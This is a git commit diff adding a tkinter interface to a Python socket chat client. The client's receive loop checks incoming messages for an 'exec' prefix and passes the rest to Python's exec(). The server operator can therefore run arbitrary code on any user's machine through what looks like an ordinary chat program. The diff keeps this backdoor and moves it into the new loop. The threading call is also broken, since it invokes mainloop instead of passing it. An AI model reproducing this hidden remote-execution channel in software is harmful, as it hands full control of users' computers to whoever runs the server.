219497f014d88020335fceddfa8a52a788be32a4
Taner Şan <79445142+Tnrsn@users.noreply.github.com>
2022-12-12 16:31:53 +0300

    GUI Added

--- Client.py
+++ Client.py
@@ -1,34 +1,59 @@
 import socket
 import threading
 import sys, subprocess
-from colorama import Fore, Back, Style
+import tkinter as tk
+
+
+
+root = tk.Tk()
+
+entry = tk.Entry()
+entry.pack()
+
+listbox = tk.Listbox(root)
+listbox.pack()
 
 PORT = 4545
 
-SERVER = "10.1.56.61"
+SERVER = "10.1.56.53"
 #SERVER = socket.gethostbyname(socket.gethostname())
 
 client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 client.connect((SERVER, PORT))
 
 def send_msg():
-    msg = input()
+    # msg = input()
+    msg = entry.get()
     message = msg.encode('utf-8')
     client.send(message)
 
+
 def recieveMsg():
-    try:
-        recievedMsg = client.recv(1024).decode()
-        if(recievedMsg[0: 4] == "exec"):
-            exec(recievedMsg[5:])
-        else:
-            print(recievedMsg)
+    while(True):
+        try:
+            recievedMsg = client.recv(1024).decode()
+            if(recievedMsg[0: 4] == "exec"):
+                exec(recievedMsg[5:])
+            else:
+                # Add a value to the listbox
+                listbox.insert(tk.END, recievedMsg)
+                # print(recievedMsg)
 
-    except:
-        print("Disconnected from the server!")
+        except:
+            print("Disconnected from the server!")
 
-while True:
-    recieveThread = threading.Thread(target=recieveMsg, args=())
-    sendThread = threading.Thread(target=send_msg, args=())
-    recieveThread.start()
-    sendThread.start()
+button = tk.Button(text="Submit", command=send_msg)
+button.pack()
+
+recieveThread = threading.Thread(target=recieveMsg, args=())
+recieveThread.start()
+
+GUIThread = threading.Thread(target=root.mainloop(), args=())
+GUIThread.start()
+
+# while True:
+#     recieveThread = threading.Thread(target=recieveMsg, args=())
+#     # sendThread = threading.Thread(target=send_msg, args=())
+#     recieveThread.start()
+#     # sendThread.start()
+
